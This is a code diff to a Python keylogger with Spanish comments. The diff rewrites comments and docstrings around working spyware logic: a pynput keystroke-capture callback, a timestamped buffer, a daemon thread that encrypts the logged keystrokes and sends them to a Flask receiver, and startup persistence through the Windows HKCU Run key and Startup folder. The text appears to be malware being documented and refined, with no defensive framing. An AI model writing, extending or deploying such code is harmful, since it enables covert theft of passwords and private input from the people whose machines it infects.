@@ -29,9 +29,11 @@ from crypto_utils import encrypt, load_key, generate_key, save_key
 from persistence import install_persistence
 from exfiltration import send_encrypted_data
 
-# Buffer global de teclas
+# Buffer global: lista de tuplas (timestamp, tecla)
+# buffer_lock evita que el hilo de envío y on_press escriban al mismo tiempo
 buffer = []
 buffer_lock = threading.Lock()
+
 
 def _load_or_create_key():
     key_path = get_key_path()
@@ -49,12 +51,14 @@ KEY = _load_or_create_key()
 
 
 def on_press(key):
-    """Callback llamado cada vez que se presiona una tecla."""
+    """
+    Callback de pynput: se ejecuta en cada pulsación.
+    key.char funciona en letras/números; las teclas especiales no tienen .char.
+    """
     try:
-        # Intentar obtener el carácter
-        char = key.char
+        char = key.char  # tecla normal (a, 1, etc.)
     except AttributeError:
-        # Tecla especial
+        # Tecla especial sin representación directa (Enter, Shift, etc.)
         if key == keyboard.Key.space:
             char = " "
         elif key == keyboard.Key.enter:
@@ -99,15 +103,18 @@ def capture_loop():
 
 
 def exfiltration_loop():
-    """Hilo que envía los datos periódicamente."""
+    """
+    Hilo secundario (daemon): cada SEND_INTERVAL segundos vacía el buffer,
+    formatea el log, lo cifra y lo envía al receptor Flask.
+    """
     while True:
-        time.sleep(SEND_INTERVAL)
+        time.sleep(SEND_INTERVAL)  # intervalo configurable en config.py
         data = get_buffer_and_clear()
 
         if not data:
-            continue
+            continue  # no hubo teclas en este intervalo
 
-        # Formatear el log
+        # Formato: "2026-07-06T10:00:00 | a"
         log_lines = []
         for timestamp, char in data:
             log_lines.append(f"{timestamp.isoformat()} | {char}")
@@ -124,14 +131,15 @@ def exfiltration_loop():
 
 
 if __name__ == "__main__":
+    # Importante al arrancar desde el registro: el cwd puede ser System32
     os.chdir(get_app_dir())
 
-    # === PERSISTENCIA ===
+    # Registra el .bat en HKCU Run + carpeta Inicio (solo en Windows)
     install_persistence(get_default_entrypoint())
 
-    # Iniciar hilo de envío periódico
+    # Hilo daemon: si el programa termina, el hilo también se cierra
     exfil_thread = threading.Thread(target=exfiltration_loop, daemon=True)
     exfil_thread.start()
 
-    # Iniciar captura (bloqueante)
+    # Hilo principal bloqueante: mantiene vivo el listener de pynput
     capture_loop()
